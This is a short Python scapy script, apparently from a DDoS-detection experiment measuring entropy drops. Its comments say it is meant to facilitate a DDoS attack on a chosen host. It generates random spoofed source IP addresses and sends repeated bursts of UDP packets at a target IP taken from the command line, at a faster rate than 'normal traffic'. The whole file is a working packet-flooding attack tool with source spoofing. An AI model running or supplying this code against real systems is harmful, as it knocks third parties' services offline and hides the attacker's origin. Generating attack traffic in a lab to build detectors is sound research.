# choose a few hosts in order to facilitate a DDoS attack on a particular host
# from the chosen host attack a chosen node/host
# this will result in drop of entropy

import sys
import time
from random import randrange
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP

def genSourceIP(): 
    doNotTakeIP = [1,2,10,127,169,172,192,254] # these numbers aren't valid in the first octate of the IP as they corresponds to the reserved IP addresses

    firstOctate = randrange(1,256)

    while firstOctate in doNotTakeIP:
        firstOctate = randrange(1,256)

    IPaddr = ".".join([str(firstOctate),str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])

    return IPaddr


def main():
  for i in range (1,5):
    mymain()
    time.sleep (10)
#send the generated IPs 
def mymain():

#dest ip address to send packets in order to attack 
  destIP = sys.argv[1:]
  srcPort = 80
  destPort = 1

# open interface eth0 to send packets
  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

  for i in xrange(0,500):
# form the packet
    packets = Ether()/IP(dst=destIP,src=genSourceIP())/UDP(dport=destPort,sport=srcPort)
    print(repr(packets))

# the interval of sending packets is decreased, it was 0.1 sec for normal traffic generation and now 0.025, min 0.001 is valid
    sendp(packets,iface=interface.rstrip(),inter=0.025)

#main


if __name__=="__main__":
	main()
